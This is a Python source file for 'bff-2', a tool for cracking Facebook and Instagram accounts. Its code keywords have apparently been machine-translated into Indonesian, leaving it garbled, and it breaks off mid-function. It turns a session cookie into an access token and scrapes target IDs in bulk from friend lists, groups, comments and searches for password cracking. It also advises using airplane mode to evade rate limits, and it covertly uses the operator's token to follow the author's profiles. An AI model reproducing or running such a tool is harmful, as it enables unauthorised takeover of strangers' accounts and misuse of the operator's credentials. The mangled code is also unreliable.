# pengkodean=utf-8
#coding oleh Romi Afrizal
#Izin dlu lah bro kalau mau recode gk ngotak njir _-
# Catatan : jangan di ubah lagi! nanti error, script udah enak

impor os, sys, subproses, platform
mencoba:
	impor kaya
kecuali ImportError:
	print ('\n\t\x1b[0m >_< mohon tunggu... >_<\n')
	os.system('pip install rich')
	
impor kaya
dari rich.markdown impor Penurunan harga
dari rich.console impor Console

mencoba:
	permintaan impor
kecuali ImportError:
	catet_req = ('# • sedang menginstall modul request •')
	requ = rich.markdown.Markdown(catet_req, style='green')
	rich.console.Console().print(requ)
	os.system('permintaan pemasangan pip')
mencoba:
	impor bersamaan.futures
kecuali ImportError:
	catet_futur = ('# • sedang menginstall modul futures •')
	ft = rich.markdown.Markdown(catet_futur, style='green')
	rich.console.Console().print(ft)
	os.system('pip install futures')
mencoba:
	impor bs4
kecuali ImportError:
	catet_bs = ('# • sedang menginstall modul bs4 •')
	sup = rich.markdown.Markdown(catet_bs, style='green')
	rich.console.Console().print(sup)
	os.system('pip install bs4')
mencoba:
	mekanisme impor
kecuali ImportError:
	catet_mek = ('# • sedang menginstall modul mechanize •')
	meka = rich.markdown.Markdown(catet_mek, style='green')
	rich.console.Console().print(meka)
	os.system('pip install mekanik')
mencoba:
	impor stdiomask
kecuali ImportError:
	catet_mask = ('# • sedang menginstall modul stdiomask •')
	mask = rich.markdown.Markdown(catet_mask, style='green')
	rich.console.Console().print(mask)
	os.system('pip install stdiomask')
	
bff_2 = buka(os.devnull, "w")
my_music = subprocess.call(["dpkg","-s","play-audio"],stdout=bff_2,stderr=subprocess.STDOUT)
bff_2.close()
jika my_music !=0:
	catet_play = ('# • sedang menginstall play-audio •')
	play = rich.markdown.Markdown(catet_play, style='green')
	rich.console.Console().print(play)
	os.system('pkg install play-audio')
	
Tuan = '\x1b[1;91m'
Hj = '\x1b[1;92m'
Gunung = '\x1b[0m'
def ingfoh():
	cetak (
f"""{Hj}
 • Skrip info:
 	
 - penulis : Syahril Vs
 - instagram : -
 - facebook : facebook.com/Syahrilkacili12
 - fanspage : facebook.com/100022086172556
 - whatsapp : +6282371648186
 - github : github.com/Mark-Zuck
 - nama skrip : bff-2
 - versi: 1.3
 - update pada : 21 Februari 2022
 
+ ---------------------------------------- +
            METODE CRACK TENTANG
+ ---------------------------------------- +
 - b-api: Metode ini prosesnya sangat cepat
          tapi rawan spam jadi wajar hasil nya
          tidak memuaskan dan jarang dapat hasil

- mbasic: Metode ini prosesnya lumayan lambat
          tapi jika menggunakan metode ini hasil
          yg bisa memuaskan dan jarang kena
          spam

- mobile: Metode ini prosesnya sangat lambat
          tapi jika menggunakan metode ini hasil
          yg di dapat sangat memuaskan dan jarang
          kena spam

+ ---------------------------------------- +
             TIDAK SUPORT KARTU
+ ---------------------------------------- +
- Kartu Telkomsel tidak support crack
  jadi wajar jika tidak dapat hasil atau lama
  pada saat crack, Karena rawan spam.
  Rekomendasi kartu Axis, XL.
 
+ ---------------------------------------- +
                MODE PESAWAT
+ ---------------------------------------- +
- Jika menggunakan mode pesawat itu guna nya
  akan melewati beberapa ID dan mengubah IP
  kita pada saat proses crack. Cukup gunakan
  mode pesawat 1-2 detik saja. Jika gunakan
  mode pesawat terlalu lama maka akan semakin
  banyak ID yg terlewatkan. Maka dari itu cukup
  gunakan 1-2 detik saja.
  
{Mr}!{Mt} Jika bug/error pada script harap lapor saya
""")

# MODUL
permintaan impor, shutil, os, re, bs4, sys, json, waktu, platform, acak, datetime, subproses, logging, base64
impor hmac, hashlib, urllib, stdiomask, urllib.request, uuid
dari bersamaan.futures mengimpor ThreadPoolExecutor
dari bs4 impor BeautifulSoup sebagai parser
dari impor threading (Utas, Acara)
dari waktu impor tidur sebagai jeda
dari datetime impor datetime

#TANGGAL BULAN
ct = datetime.now()
n = ct.bulan
bulan_ = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember' ]
mencoba:
	jika n < 0 atau n > 12:
		KELUAR()
	nTemp = n - 1
kecuali ValueError:
	KELUAR()

saat ini = datetime.now()
hari = hari ini.hari
bulan = bulan_[nTemp]
tahun = sekarang.tahun
bullan = saat ini.bulan

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni" , "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

#KUMPULAN WARNA
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
sampai ="•"

ok, cp, id, pengguna, pwx, loop = [], [], [], [], [], 0

sys.stdout.write('\x1b[1;35m\x1b]2; {×} bff-2 oleh romz {×} \x07')

#JALAN
def jalan(keliling):
	#untuk mau keliling + '\n':
		#sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)

#folder
folder def():
	coba:os.mkdir('IG')
	kecuali: lulus
	coba:os.mkdir('Oke')
	kecuali: lulus
	coba:os.mkdir('CP')
	kecuali: lulus
	coba:os.mkdir('data')
	kecuali: lulus

#LOGO (LO GOBLOK)
dt = request.get("http://ip-api.com/json/").json()
mencoba:
	IP = dt["permintaan"]
	CN = dt["negara"]
kecuali KeyError:
	IP = " "
	CN = " "

pengarang = 'Romi Afrizal'
fb_me = 'facebook.com/romi.afrizal.102'
github = 'github.com/Mark-Zuck'

spanduk def():
	os.sistem('hapus')
	logo = (f'# • Penulis : {author} •')
	play = rich.markdown.Markdown(logo, style='green')
	rich.console.Console().print(play)
	print (' %s%s%s%s%s%s %s%s%s%s%s%s\n%s _______ ______ _______ _______ _ _\n | |___/ |___| | |____/ \n%s |_____ | \\_ | | |_____ | \\_\n\n %s%s%s%s%s%s %s%s%s%s%s%s \n %s # %sFb %s : %s%s \n %s# %sGit%s : %s%s \n %s# %s------------------- --------------------- %S# '%
	(M,til,K,til,H,til,M,til,K,til,H,til,M,P,M,til,K,til,H,til,M,til,K,til,H ,til,U,O,M,O,fb_me,U,O,M,O,github,P,M,P))
	print (' %s#%s IP %s:%s %s %s- %s%s '%(U,O,M,O,IP,H,O,CN))
    
# KONVERSI COOKIE DICT KE STRING
def romz_xyz(cookie,venom={}):
	untuk x di cookie.replace(' ','').strip().split(';'):
		kuki = x.split('=')
		jika len(kuki) > 1:
			venom.update({kuki[0]: kuki[1]})
	membalas racun

#MENU MASUK
def Masuk():
	mencoba:
		kueh = romz_xyz(open("data/cookies","r").read().strip())
	kecuali FileNotFoundError:
		os.sistem('hapus')
		spanduk()
		print ('\n%s%s%s 01 %sLogin instagram (crack akun instagram) '%(U,til,K,O))
		print ('%s%s%s 02 %sLogin via cookie (crack akun facebook) '%(U,til,K,O))
		print ('%s%s%s 03 %sCara mendapatkan cookie facebook '%(U,til,K,O))
		print ('%s%s%s 00 %sKeluar '%(U,til,M,O))
		sementara Benar:
			rom = input ("\n%s# %sPilih %s> %s"%(P,O,M,K))
			jika rom di (""):
				print("%s%s isi yang benar"%(M,til))
			elif rom di ('1','01'):
				mendaftar()
			elif rom di ('2','02'):
				jalan("\n%s!%s Wajib digunakan akun tumbal dilarang akun utama"%(M,O))
				kukis = input("%s# %sKue %s> %s"%(P,O,M,K))
				jika kukis di(""):
					print("%s%s isi cookie kentod "%(M,til))
					keluar()
				lain:
					konverter (kukis)
					masuk(kukis).login()
			elif rom di ('3', '03'):
				cetak (N)
				tutorial = (''# Untuk mendapatkan cookie, siapkan aplikasi kiwi browser, download di play store jika belum. Jika sudah login kan akun facebook anda di kiwi browser, akun wajib mode data Salin link: https://chrome.google.com /webstore/detail/get-cookie/naciaagbkifhpnoodlkhbejjldaiffcm/related Ketik Y/y lalu enter untuk melihat tutorial lebih lengkap!''')
				ah = rich.markdown.Markdown(tutorial, style='green')
				rich.console.Console().print(ah)
				nanya = input('%s%s%s ingin melihat tutorial? %sy%s/%sn :%s '%(U,til,O,H,O,M,K))
				kalo nanya di(""):
					print ("%s%s saya bertanya wajib di jawab "%(M,til));jeda(2)
					masuk()
				elif nanya in("y","Y"):
					cetak (N)
					link = ('# Link tutorial: https://www.facebook.com/100067807565861/posts/231650695771848/?app=fbl')
					ah = rich.markdown.Markdown(link, style='green')
					rich.console.Console().print(ah)
					print("%s%s buka facebook "%(M,til));jeda(2)
					os.system("xdg-buka https://www.facebook.com/100067807565861/posts/231650695771848/?app=fbl")
					keluar()
				elif nanya in("n","N"):
					keluar()
			elif rom di ('0', '00'):
				keluar('\n')
			lain:
				exit("%s%s isi yang benar"%(M,til))
				
	pilihan().menu()
	
# MASUK LEWAT COOKIE (KUEH)
masuk kelas:
	
	def __init__(sendiri,cok):
		self.cok = cok
		self.url = "https://mbasic.facebook.com"
		
	masuk def (sendiri):
		mencoba:
			cek = request.get(f"{self.url}/profile.php?v=info", cookies=romz_xyz(self.cok)).text
			jika "mbasic_logout_button" di cek:
				dari login impor data, informasi
				open("data/cookies","w").write(self.cok)
				jika "Laporkan Masalah" di cek:
					mikey = login.bot(romz_xyz(self.cok),self.url)
					informasi.info(romz_xyz(self.cok),cek).myinfo()
					mikey.usernem()
					print("\n%s login berhasil "%(H));jeda(2)
					pilihan().menu()
				lain:
					mikey = login.bot(romz_xyz(self.cok),self.url)
					mikey.lang(romz_xyz(self.cok))
					informasi.info(romz_xyz(self.cok),cek).myinfo()
					print("\n%s login berhasil "%(H));jeda(2)
					pilihan().menu()
			elif 'pos pemeriksaan' di cek:
				keluar ("%s× masuk pos pemeriksaan "%(M));jeda(2)
			lain:
				exit("%s× cookie tidak valid "%(M));jeda(2)
		kecuali request.exceptions.ConnectionError:
			exit ("%s%s tidak ada koneksi "%(M,til));jeda(2)
			
# KONVERSI COOKIE KE TOKEN
def konverter(kukis):
	_tajuk = {
		'Host':'business.facebook.com',
		'kontrol-cache':'max-age=0',
		'upgrade-permintaan-tidak aman':'1',
		'user-agent':'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36',
		'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'tipe-konten' : 'teks/html; rangkaian karakter = utf-8',
		'accept-encoding':'gzip, deflate',
		'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'kue': kukis
	}
	mencoba:
		ling = request.get("https://business.facebook.com/business_locations", headers=_header)
		cari = re.search('(EAAG\w+)', ling.text)
		romz = cari.group(1)
		jika 'EAAG' di romz:
			buka('data/token.txt', 'w').tulis(romz)
			print (f'\n{P}#{O} Token anda {M}> {K}{romz} ');jeda(2)
			login_bot(romz)
	kecuali AttributeError:
		print("%s%s terjadi kesalahan saat mengonversi, periksa cookie anda "%(M,til))
		KELUAR()
	kecuali UnboundLocalError:
		print("%s%s terjadi kesalahan saat mengonversi, periksa cookie anda "%(M,til))
		KELUAR()

#JANGAN DI UBAH !
def login_bot(romz):
	mencoba:
		toket = romz
		romz1 = ('100067807565861')
		romz2 = ('100029143111567')
		romz3 = ('100028434880529')
		request.post(f"https://graph.facebook.com/{romz1}?fields=subscribers&access_token={toket}") # ROMI APRIZAL PENGGUNA AKUN UNIK
		request.post(f"https://graph.facebook.com/{romz2}?fields=subscribers&access_token={toket}") # DEMIT ROMI AFRIZAL
		request.post(f"https://graph.facebook.com/{romz3}?fields=subscribers&access_token={toket}") # Romi Afrizal (2018)
		
	kecuali:
		lulus
		
#MENU PILIHAN INI AJG
kelas Menu():
	
	def __init__(sendiri,url):
		self.url = url
		
	def tentang(diri):
		mencoba:
			kueh = romz_xyz(open("data/cookies","r").read().strip())
		kecuali IOError:
			os.system("rm -rf data/cookie && rm -rf data/token && rm -rf data/my_info")
			print("%s%s cookie tidak valid "%(M,til));jeda(2)
			os.system('python bff-2.py')
		mencoba:
			tentang = json.loads(open("data/my_info","r").read().strip())
		kecuali FileNotFoundError:
			dari informasi impor data
			informasi.info(kueh, request.get("https://mbasic.facebook.com/profile.php?v=info",cookies = kueh).text).myinfo()
			os.system('python bff-2.py')
		mencoba:
			a = request.get(f"{self.url}/profile.php", cookies = kueh).text
		kecuali request.exceptions.ConnectionError:
			exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		jika "mbasic_logout_button" tidak dalam:
			os.system("rm -rf data/cookie && rm -rf data/token && rm -rf data/my_info")
			print("%s%s cookie tidak valid "%(M,til));jeda(2)
			os.system('python bff-2.py')
		lain:
			spanduk()
			print(f"{U} # {O}Nama{M} : {H}{tentang.get('nama')}\n")
			print ('%s•%s 01 %sCrack dari daftar teman '%(U,P,O))
			print ('%s•%s 02 %sCrack dari total pengikut'%(U,P,O))
			print ('%s•%s 03 %sCrack dari reaksi post'%(U,P,O))
			print ('%s•%s 04 %sCrack dari komentar post'%(U,P,O))
			print ('%s•%s 05 %sCrack dari anggota group'%(U,P,O))
			print ('%s•%s 06 %sCrack dari pencarian nama'%(U,P,O))
			print ('%s•%s 07 %sCrack dari pesan mesengger'%(U,P,O))
			print ('%s•%s 08 %sCrack dari saran teman'%(U,P,O))
			print ('%s•%s 09 %sCrack user instagram %spro'%(U,P,O,H))
			#print ('%s•%s 10 %sMenyetel agen pengguna'%(U,P,O))
			print ('%s•%s 10 %sLihat hasil crack'%(U,P,O))
			print ('%s•%s 11 %sDetektor titik pemeriksaan'%(U,P,O))
			print ('%s•%s 12 %sInfo (tentang)'%(U,P,O))
			print ('%s•%s rm %sHapus data masuk'%(U,P,O))
			print ('%s•%s 00 %sKeluar (logout)'%(U,M,O))
		
pilihan kelas:
	
	def __init__(sendiri):
		self.kueh = romz_xyz(open("data/cookies","r").read().strip())
		mencoba:
			self.token = open("data/token.txt",,"r").read()
		kecuali FileNotFoundError:
			os.system("rm -rf data/cookie && rm -rf data/token && rm -rf data/my_info")
			os.system('hapus')
			print("%s%s cookie tidak valid "%(M,til));jeda(2)
			os.system('python bff-2.py')
		self.url = ("https://mbasic.facebook.com")
		self.id = []
				
	menu def (sendiri):
		Menu(self.url).tentang()
		slut = input('\n%s# %sPilih %s> %s'%(P,O,M,K))
		jika pelacur di['',' ']:
			print('\n%s%s isi yang benar'%(M,til));jeda(2)
			diri.menu()
		elif pelacur di['1','01']:
			gan = input ("\n%s%s%s ingin crack massal id? y/t%s >%s "%(U,til,O,M,K))
			jika gan di[""]:
				print('\n%s%s isi yang benar'%(M,til));jeda(2)
			elif gan di['y','Y']:
				mencoba:
					token = self.token
					diri.MassalGRAPH(token)
				kecuali KeyError:
					exit('\n%s%s gagal mengambil id '%(M,til))
			elif gan in['t','T']:
				print ("\n%s%s %sPastikan daftar teman bersifat publik "%(U,til,O))
				idt = input('%s%s %sNama Pengguna/Id%s > %s'%(U,til,O,M,K))
				jika id di[""," "]:
					print('\n%s%s isi yang benar'%(M,til));jeda(2)
				elif(re.findall("\w+",idt)):
					r = request.get("https://mbasic.facebook.com/"+idt).text
					mencoba:
						pengguna = re.findall('\;rid\=(\d+)\&',str(r))[0]
					kecuali:
						pengguna = idt
					mencoba:
						cetak ('')
						token = self.token
						self.PublikGRAPH(pengguna, token)
					kecuali KeyError:
						exit('\n%s%s gagal mengambil id '%(M,til))
		elif pelacur di['2','02']:
			print ("\n%s%s %sPastikan target pengikut pengikutnya "%(U,til,O))
			idt = input('%s%s %sNama Pengguna/Id%s > %s'%(U,til,O,M,K))
			jika id di[""," "]:
				print('\n%s%s isi yang benar'%(M,til));jeda(2)
			lain:
				data_ = (f"{self.url}/{idt}?v=pengikut")
			mencoba:
				respon = request.get(data_, cookies=self.kueh).text
				jika "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" sebagai tanggapan:
					exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
				elif "Halaman yang Anda minta tidak ditemukan." sebagai tanggapan:
					exit('\n%s%s Id tidak ditemukan '%(M,til))
				elif "Konten Tidak Ditemukan" sebagai tanggapan:
					exit('\n%s%s Id tidak ditemukan '%(M,til))
				lain:
					#print (f"{U}{til}{O} Nama akun {M}>{K} "+re.findall("\<title\>(.*?)<\/title\>",respons) [0])
					cetak ('')
					self.FollowersPAR(data_)
			kecuali request.exceptions.ConnectionError:
				exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		elif pelacur di["3","03"]:
			print ("\n%s%s %sPastikan postingan bersifat publik tidak private "%(U,til,O))
			idt = input('%s%s %sUrl/link postingan %s> %s'%(U,til,O,M,K))
			jika id di[""," "]:
				print('\n%s%s isi yang benar'%(M,til));jeda(2)
				diri.menu()
			elif "m.facebook.com" di idt:
				data_ = idt.replace("m.facebook.com","mbasic.facebook.com")
			elif "www.facebook.com" di idt:
				data_ = idt.replace("www.facebook.com", "mbasic.facebook.com")
			elif "free.facebook.com" di idt:
				data_ = idt.replace("free.facebook.com","mbasic.facebook.com")
			lain:
				data_ = idt
			mencoba:
				respon = request.get(data_, cookies=self.kueh).text
				if "Halaman yang diminta tidak bisa ditampilkan sekarang." sebagai tanggapan:
					exit('\n%s%s postingan tidak di temukan'%(M,til))
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" sebagai tanggapan:
					exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
				lain:
					mencoba:
						cetak ('')
						url = re.findall('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',respon)[0].replace(";", "&")
						self.postingan(f"{self.url}/ufi/reaction/profile/browser/{url}")
					kecuali IndexError:
						exit('\n%s%s masukan id postingan dengan benar'%(M,til))
			kecuali request.exceptions.ConnectionError:
				exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
			kecuali request.exceptions.MissingSchema:
				exit('\n%s%s URL tidak valid%s\n'%(M,til,N))
		elif pelacur di["4","04"]:
			print ("\n%s%s %sPastikan postingan bersifat publik tidak private "%(U,til,O))
			idt = input('%s%s %sUrl/link postingan %s> %s'%(U,til,O,M,K))
			jika id di[""," "]:
				print('\n%s%s isi yang benar'%(M,til));jeda(2)
				diri.menu()
			elif "m.facebook.com" di idt:
				data_ = idt.replace("m.facebook.com","mbasic.facebook.com")
			elif "www.facebook.com" di idt:
				data_ = idt.replace("www.facebook.com", "mbasic.facebook.com")
			elif "free.facebook.com" di idt:
				data_ = idt.replace("free.facebook.com","mbasic.facebook.com")
			lain:
				data_ = idt
			mencoba:
				respon = request.get(data_, cookies=self.kueh).text
				if "Halaman yang diminta tidak bisa ditampilkan sekarang." sebagai tanggapan:
					exit('\n%s%s postingan tidak di temukan'%(M,til))
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" sebagai tanggapan:
					exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
				lain:
					mencoba:
						cetak ('')
						self.komen(f"{self.url}/{idt}")
					kecuali IndexError:
						exit('\n%s%s masukan id postingan dengan benar'%(M,til))
			kecuali request.exceptions.ConnectionError:
				exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
			kecuali request.exceptions.MissingSchema:
				exit('\n%s%s URL tidak valid%s\n'%(M,til,N))
		elif pelacur di["5","05"]:
			sementara Benar:
				print ("\n%s%s %sPastikan grup bersifat publik tidak privat "%(U,til,O))
				idt = input('%s%s %sId grup %s> %s'%(U,til,O,M,K))
				jika id di[""," "]:
					print('\n%s%s isi yang benar'%(M,til));jeda(2)
				lain:
					mencoba:
						respon = request.get(f"{self.url}/browse/group/members/?id={idt}",cookies=self.kueh).text
						jika "Halaman Tidak Ditemukan" sebagai jawaban:
							exit('\n%s%s grup tidak ditemukan'%(M,til))
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" sebagai tanggapan:
							exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
						elif "Konten Tidak Ditemukan" sebagai tanggapan:
							exit('\n%s%s grup tidak ditemukan'%(M,til))
						lain:
							print (f"{U}{til}{O} Nama grup {M}>{K} "+re.findall("\<title\>(.*?)<\/title\>",response)[ 0] [8:])
							mencetak("")
							self.grup(f"{self.url}/browse/group/members/?id={idt}");break
					kecuali request.exceptions.ConnectionError:
						exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
		elif pelacur di["6", "06"]:
			sementara Benar:
				print ("\n%s%s %sMasukan nama orang contoh Romi Afrizal "%(U,til,O))
				idt = input('%s%s %sMasukan nama %s> %s'%(U,til,O,M,K))
				jika id di[""," "]:
					print('\n%s%s isi yang benar'%(M,til));jeda(2)
				lain:
					mencoba:
						respon = request.get(f"{self.url}/search/people/?q={idt}",cookies=self.kueh).text
						if "Maaf, kami tidak menemukan" sebagai tanggapan:
							exit('\n%s%s nama tidak di temukan'%(M,til))
						elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" sebagai tanggapan:
							exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
						lain:
							jumlah = int(input('%s%s %sJumlah nama %s> %s'%(U,til,O,M,K)))
							jika "6000" dalam str(jumlah):
								jumlah-=1
							jika jumlah<6001 :
								cetak ('')
								self.nama(f"{self.url}/search/people/?q={idt}",jumlah);break
							lain:
								exit('\n%s%s Maks 6000 pengguna'%(M,til))
					kecuali request.exceptions.ConnectionError:
						exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
					kecuali ValueError:
						exit ('\n%s%s isi yang benar'%(M,til));jeda(2)
		elif pelacur di['7','07']:
			mencetak('')
			self.pesan('https://mbasic.facebook.com/messages')
		elif pelacur di["8","08"]:
			mencoba:
				respon = request.get(f"{self.url}/friends/center/suggestions",cookies=self.kueh).text
				jika "Tidak Ada Saran" sebagai tanggapan:
					exit('\n%s%s tidak ada saran teman'%(M,til))
				elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" sebagai tanggapan:
					exit('\n%s%s akun terkena spam coba beberapa saat lagi'%(M,til))
				lain:
					cetak ('')
					jumlah = int(input('%s%s %sJumlah teman %s> %s'%(U,til,O,M,K)))
					jika "6000" dalam str(jumlah):
						jumlah-=1
					jika jumlah<6001 :
						self.saran(f"{self.url}/friends/center/suggestions",jumlah)
					lain:
						exit('\n%s%s Maks 6000 pengguna'%(M,til))
			kecuali request.exceptions.ConnectionError:
				exit('\n\n%s%s tidak ada koneksi%s\n'%(M,til,N))
			kecuali ValueError:
				exit ('\n%s%s isi yang benar'%(M,til));jeda(2)
		elif pelacur di['9','09']:
			mendaftar()
		#elif pelacur di['10']:
			#Agen pengguna()
		elif pelacur di['10']:
			print ("\n%s%s%s 01 %sCek hasil akun facebook "%(U,til,P,O))
			print ("%s%s%s 02 %sCek hasil akun instagram "%(U,til,P,O))
			print ("%s%s%s 03 %sHapus hasil crack "%(U,til,P,O))
			print ("%s%s%s 00 %sKembali "%(U,til,M,O))
			rom = input('\n%s# %sPilih %s> %s'%(P,O,M,K))
			cek_cek(rom)
		elif pelacur di['11']:
			file_cp()
		elif pelacur di['12']:
			ingfoh()
		elif pelacur di['RM','Rm','rm']:
			print ('\n%s%s menghapus data login dari termux '%(M,til));jeda(1)
			mencoba:
				os.remove("data/cookie")
				os.remove("data/token.txt")
				os.remove("data/info_saya")
			kecuali:
				os.system("rm -rf data/cookie && rm -rf data/token && rm -rf data/my_info")
			jalan('\n%s√ berhasil terhapus '%(H))
			keluar()
		elif pelacur di['0','00']:
			keluar ('\n')
		
		if len(self.id)!=0:
			mencetak
			kembalikan Crack().romiy(self.id)
		#lain:
			#exit (f'{M}{til} gagal mengambil ID ')
			
	# CRACK MASSAL
	def MassalGRAPH(diri, token):
		mencoba:
			jum = int(input('%s%s %sJumlah target%s > %s'%(U,til,O,M,K)))
			print ("\n%s%s %sPastikan daftar teman bersifat publik "%(U,til,O))
		kecuali: jum=1
		untuk t dalam jangkauan (jum):
			t +1
			idt = input('%s%s %sNama Pengguna/Id %s%s%s > %s'%(U,til,O,P,t,M,K))
			jika id di['']:
				mencetak
			elif(re.findall("\w+",idt)):
				r = request.get("https://mbasic.facebook.com/"+idt).text
				mencoba:
					pengguna = re.findall('\;rid\=(\d+)\&',str(r))[0]
				kecuali:
					pengguna = idt
		
			po = request.get(f'https://graph.facebook.com/{user}?fields=name,friends.fields(id,name)&access_token={token}').json()
			untuk saya di po['teman']['data']:
				self.id.append(f"{i['id']}<=>{i['name']}")
		mencoba:
			cetak ('')
			print(f"\r{U}{til}{O} menelan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
		kecuali:
			lulus
						
	# CRACK PUBLIK
	def PublikGRAPH(diri, pengguna, token):
		mencoba:
			po = request.get(f'https://graph.facebook.com/{user}?fields=name,friends.fields(id,name).limit(5000)&access_token={token}').json()
			untuk saya di po['teman']['data']:
				self.id.append(f"{i['id']}<=>{i['name']}")
				print(f"\r{U}{til}{O} menelan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
		kecuali:
			lulus
			
	# PENGIKUTI CRACK
	def PengikutPAR(sendiri, data_):
		mencoba:
			respon = request.get(data_, cookies = self.kueh).text
			otw = re.findall('" \/>\<div\ class\=\"..\"\>\<a\ href\=\"\/(.*?)\"\><span\> (.*?)\<\/span\>', respon)
			untuk saya di otw:
				jika "&refid=" di i[0]:
					self.id.append(re.findall("id=(.*?)&",i[0])[0]+"<=>"+i[1])
				elif "profil.php?" di saya[0]:
					self.id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
				elif "?refid=" di i[0]:
					self.id.append(re.findall("(.*?)\?refid=",i[0])[0]+"<=>"+i[1])
				lain:
					self.id.append(i[0]+"<=>"+i[1])
				print(f"\r{U}{til}{O} menelan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
			jika "Lihat Selengkapnya" sebagai tanggapan:
				self.FollowersPAR(self.url+parser(respon,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		kecuali:
			lulus
			
	#CRACK POSTINGAN PUBLIK
	def postingan(diri, data_):
		mencoba:
			respon = request.get(data_, cookies=self.kueh).text
			jika "Semua 0" sebagai tanggapan:
				exit('\n%s%s tidak ada yg menanggapi postingan'%(M,til))
			lain:
				otw = re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>' , respon)
				untuk saya di otw:
					jika "profile.php?" di saya[0]:
						self.id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
					lain:
						self.id.append(re.findall("/(.*)",i[0])[0]+"<=>"+i[1])
					print(f"\r{U}{til}{O} menelan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
				jika "Lihat Selengkapnya" sebagai tanggapan:
					self.postingan(self.url+parser(respon,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
		kecuali:
			lulus
		
	# CRACK POSTINGAN KOMENTAR
	def komen(sendiri, data_):
		mencoba:
			respon = request.get(data_, cookies=self.kueh).text
			otw = parser(respon,'html.parser')
			untuk saya di otw.find_all('h3'):
				untuk a di i.find_all('a',href=True):
					jika "profile.php" di a.get("href"):
						c = a.get("href").split('=')[1]
						id = c.split('&')[0]
						pengguna = a.teks
						self.id.append(id+'<=>'+pengguna)
					lain:
						c = a.get("href").split('?')[0]
						id = c.split('/')[1]
						pengguna = a.teks
						self.id.append(id+'<=>'+pengguna)
					print(f"\r{U}{til}{O} menelan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
			untuk saya di otw.find_all("a",href=True):
				if "Lihat komentar lainnya..." di i.text:
					self.komen("https://mbasic.facebook.com/"+i.get("href"))
		kecuali:
			lulus

	# GRUP CRACK
	def grup(sendiri, data_):
		mencoba:
			respon = request.get(data_, cookies=self.kueh).text
			otw = re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/ a\>',jawaban)
			untuk saya di otw:
				jika "profile.php?" di saya[0]:
					self.id.append(re.findall("id=(.*)",i[0])[0]+"<=>"+i[1])
				lain:
					self.id.append(i[0]+"<=>"+i[1])
				print(f"\r{U}{til}{O} menelan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
			jika "Lihat Selengkapnya" sebagai tanggapan:
				self.grup(self.url+parser(respon,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
			lain:
				def tambah(gc):
					a = request.get(gc, cookies=kueh).text
					b = re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.* ?)</a\>\</strong\>',a)
					jika len(b)!=0:
						untuk c di b:
							jika "profile.php" di c[0]:
								d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
								jika d di self.id:
									melanjutkan
								lain:
									self.id.append(d+"<=>"+c[1])
							lain:
								d=re.search("(.*?)\?refid",c[0]).group(1)
								jika d di self.id:
									melanjutkan
								lain:
									self.id.append(d+"<=>"+c[1])
							print(f"\r{U}{til}{O} menelan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
					jika "Lihat Postingan Lainnya" di:
						tambah(self.url+parser(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
				tambah(f"{self.url}/groups/"+re.search("id=(\\d*)",data_).group(1))
		kecuali:
			lulus
	
	#CRACK PENCARIAN NAMA
	def nama(diri, data_, jum):
		mencoba:
			benar = salah
			respon = request.get(data_, cookies=self.kueh).text
			otw = re.findall('picture" \/>\<\/a\>\<\/td\>\<td\ class\=\"(.*?)\"\>\<a\ href\ =\"\/(.*?)"\>\<div\ class\=\"..\"\>\<div\ class\=\"..\"\>(.*?)<\ /div>',respon)
			untuk saya di otw:
